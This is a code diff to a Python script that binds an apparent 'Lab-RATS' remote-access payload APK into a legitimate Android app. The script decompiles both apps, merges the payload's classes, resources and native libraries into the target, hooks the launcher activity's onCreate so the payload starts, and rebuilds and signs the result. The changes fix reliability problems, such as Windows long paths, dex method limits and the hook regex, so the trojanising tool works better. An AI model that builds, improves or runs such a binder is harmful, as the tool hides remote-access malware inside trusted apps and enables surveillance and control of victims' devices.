@@ -70,6 +70,41 @@ def run_cmd(cmd, check=True):
     return res.stdout, res.stderr, res.returncode
 
 
+def rmtree_win(path):
+    """Delete a directory tree even when it contains >MAX_PATH files (Windows)."""
+    if os.name == "nt" and not path.startswith("\\\\?\\"):
+        path = "\\\\?\\" + os.path.abspath(path)
+    try:
+        shutil.rmtree(path, ignore_errors=True)
+    except OSError:
+        if os.name == "nt":
+            subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", path], check=False)
+        else:
+            raise
+
+
+def copy_tree_merge(src, dst):
+    """Merge-copy src tree into dst (skip files that already exist).
+
+    Uses robocopy on Windows because payload smali contains >MAX_PATH file names
+    (kotlinx-coroutines inlined lambdas) that make shutil.copytree/copy2 fail
+    with FileNotFoundError [WinError 3] when the long-path policy is disabled.
+    """
+    if os.name == "nt":
+        subprocess.run(["robocopy", src, dst, "/E", "/XC", "/XN", "/XO",
+                        "/NFL", "/NDL", "/NJH", "/NJS", "/NP"], check=False)
+    else:
+        for root, dirs, files in os.walk(src):
+            rel = os.path.relpath(root, src)
+            target_root = os.path.join(dst, rel)
+            os.makedirs(target_root, exist_ok=True)
+            for f in files:
+                sf = os.path.join(root, f)
+                df = os.path.join(target_root, f)
+                if not os.path.exists(df):
+                    shutil.copy2(sf, df)
+
+
 def get_apktool_cmd(script_dir):
     """Detect or download apktool."""
     # Check system apktool
@@ -95,7 +130,7 @@ def get_apktool_cmd(script_dir):
 def decompile_apk(apktool_cmd, apk_path, output_dir):
     log_info(f"Decompiling {os.path.basename(apk_path)}...")
     if os.path.exists(output_dir):
-        shutil.rmtree(output_dir)
+        rmtree_win(output_dir)
     cmd = apktool_cmd + ["d", "-f", "-o", output_dir, apk_path]
     run_cmd(cmd)
 
@@ -116,13 +151,20 @@ def merge_smali_and_assets(payload_dir, target_dir):
                 max_idx = idx
 
     # Target directory for payload classes
-    dest_smali_dir = os.path.join(target_dir, f"smali_classes{max_idx + 1}")
-    os.makedirs(dest_smali_dir, exist_ok=True)
-
-    # Copy all smali subdirectories from payload smali folders
+    # Copy all smali subdirectories from payload smali folders, keeping the
+    # payload's original dex partitioning (payload "smali" -> smali_classes{max+1},
+    # "smali_classesN" -> smali_classes{max+N}). Merging everything into a single
+    # dex exceeds the 64K method limit and breaks apktool b assembly.
     payload_smali_dirs = [d for d in os.listdir(payload_dir) if d == "smali" or d.startswith("smali_classes")]
     for psd in payload_smali_dirs:
         psd_path = os.path.join(payload_dir, psd)
+        if psd == "smali":
+            dest = f"smali_classes{max_idx + 1}"
+        else:
+            idx = int(re.match(r"smali_classes(\d+)", psd).group(1))
+            dest = f"smali_classes{max_idx + idx}"
+        dest_smali_dir = os.path.join(target_dir, dest)
+        os.makedirs(dest_smali_dir, exist_ok=True)
         for item in os.listdir(psd_path):
             src_item = os.path.join(psd_path, item)
             dst_item = os.path.join(dest_smali_dir, item)
@@ -132,34 +174,26 @@ def merge_smali_and_assets(payload_dir, target_dir):
                 continue
 
             if os.path.isdir(src_item):
-                if not os.path.exists(dst_item):
-                    shutil.copytree(src_item, dst_item)
-                else:
-                    # Merge directories
-                    for root, dirs, files in os.walk(src_item):
-                        rel_path = os.path.relpath(root, src_item)
-                        target_root = os.path.join(dst_item, rel_path)
-                        os.makedirs(target_root, exist_ok=True)
-                        for f in files:
-                            sf = os.path.join(root, f)
-                            df = os.path.join(target_root, f)
-                            if not os.path.exists(df):
-                                shutil.copy2(sf, df)
+                copy_tree_merge(src_item, dst_item)
+
+    # Copy Resources (themes/icons/xml configs referenced by injected manifest components)
+    payload_res = os.path.join(payload_dir, "res")
+    if os.path.exists(payload_res):
+        target_res = os.path.join(target_dir, "res")
+        os.makedirs(target_res, exist_ok=True)
+        copy_tree_merge(payload_res, target_res)
+
+    # Copy Native Libraries (e.g. CameraX jni)
+    payload_lib = os.path.join(payload_dir, "lib")
+    if os.path.exists(payload_lib):
+        copy_tree_merge(payload_lib, os.path.join(target_dir, "lib"))
 
     # Copy Assets
     payload_assets = os.path.join(payload_dir, "assets")
     target_assets = os.path.join(target_dir, "assets")
     if os.path.exists(payload_assets):
         os.makedirs(target_assets, exist_ok=True)
-        for root, dirs, files in os.walk(payload_assets):
-            rel = os.path.relpath(root, payload_assets)
-            dst_root = os.path.join(target_assets, rel)
-            os.makedirs(dst_root, exist_ok=True)
-            for f in files:
-                sf = os.path.join(root, f)
-                df = os.path.join(dst_root, f)
-                if not os.path.exists(df):
-                    shutil.copy2(sf, df)
+        copy_tree_merge(payload_assets, target_assets)
 
     log_success("Payload Smali classes and assets successfully merged.")
 
@@ -268,7 +302,7 @@ def hook_launcher_activity(target_dir, launcher_class):
     if "onCreate(" in content:
         def reg_replacer(match):
             header = match.group(1)
-            body = match.group(2)
+            body = match.group(2) if (match.lastindex or 0) >= 2 else ""
             reg_match = re.search(r'\.registers\s+(\d+)', header)
             if reg_match:
                 reg_count = int(reg_match.group(1))
@@ -276,7 +310,7 @@ def hook_launcher_activity(target_dir, launcher_class):
                     header = header.replace(f".registers {reg_count}", ".registers 2")
             return header + body + hook_code
 
-        pattern = r'(\.method\s+[^I]*onCreate\(Landroid/os/Bundle;\)V.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
+        pattern = r'(\.method\s+[^I]*onCreate\(Landroid/os/Bundle;\)V.*?)((?:\.prologue|\n\s*invoke-super[^\n]+))'
         if re.search(pattern, content, re.DOTALL):
             content = re.sub(pattern, reg_replacer, content, count=1, flags=re.DOTALL)
             log_success("Successfully hooked existing onCreate() method with register safety.")
@@ -336,7 +370,12 @@ def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore
     # Sign APK
     log_info("Signing bound APK...")
     if shutil.which("apksigner"):
-        run_cmd(["apksigner", "sign", "--ks", keystore_path, "--ks-pass", f"pass:{storepass}", "--ks-key-alias", keyalias, "--out", output_apk, aligned_apk])
+        sign_args = ["apksigner", "sign", "--ks", keystore_path, "--ks-pass", f"pass:{storepass}",
+                     "--ks-key-alias", keyalias, "--out", output_apk, aligned_apk]
+        if os.name == "nt":
+            run_cmd(" ".join(sign_args))   # apksigner.bat needs shell/cmd on Windows
+        else:
+            run_cmd(sign_args)
     elif shutil.which("jarsigner"):
         run_cmd(["jarsigner", "-verbose", "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256", "-keystore", keystore_path, "-storepass", storepass, aligned_apk, keyalias])
         shutil.copy2(aligned_apk, output_apk)
@@ -354,10 +393,22 @@ def main():
     parser.add_argument("--payload", help="Path to Lab-RATS payload APK")
     parser.add_argument("--output", help="Path to output bound APK")
     parser.add_argument("--keystore", help="Path to JKS keystore")
-    parser.add_argument("--storepass", default="lab-rats123", help="Keystore password")
-    parser.add_argument("--keyalias", default="lab-rats-key", help="Key alias")
+    parser.add_argument("--storepass", required=True,
+                        help="Keystore password (REQUIRED, no default: the old 'lab-rats123' is blocked)")
+    parser.add_argument("--keyalias", required=True,
+                        help="Key alias (REQUIRED, no default: the old 'lab-rats-key' is blocked)")
 
     args = parser.parse_args()
+
+    # Reject empty / known-default keystore credentials
+    BLOCKED_CREDS = {"", "lab-rats123", "lab-rats-key", "admin1337",
+                     "AndroidKernel1337", "TacticalKey2026SecureGCM"}
+    if args.storepass in BLOCKED_CREDS or len(args.storepass) < 12:
+        log_err("ABORTED: --storepass is empty, shorter than 12 chars, or matches a blocked default value.")
+        sys.exit(1)
+    if args.keyalias in BLOCKED_CREDS:
+        log_err("ABORTED: --keyalias is empty or matches a blocked default value.")
+        sys.exit(1)
 
     script_dir = os.path.dirname(os.path.realpath(__file__))
     project_dir = os.path.dirname(script_dir)
@@ -411,7 +462,7 @@ def main():
 
     finally:
         if os.path.exists(work_dir):
-            shutil.rmtree(work_dir, ignore_errors=True)
+            rmtree_win(work_dir)
 
 
 if __name__ == "__main__":
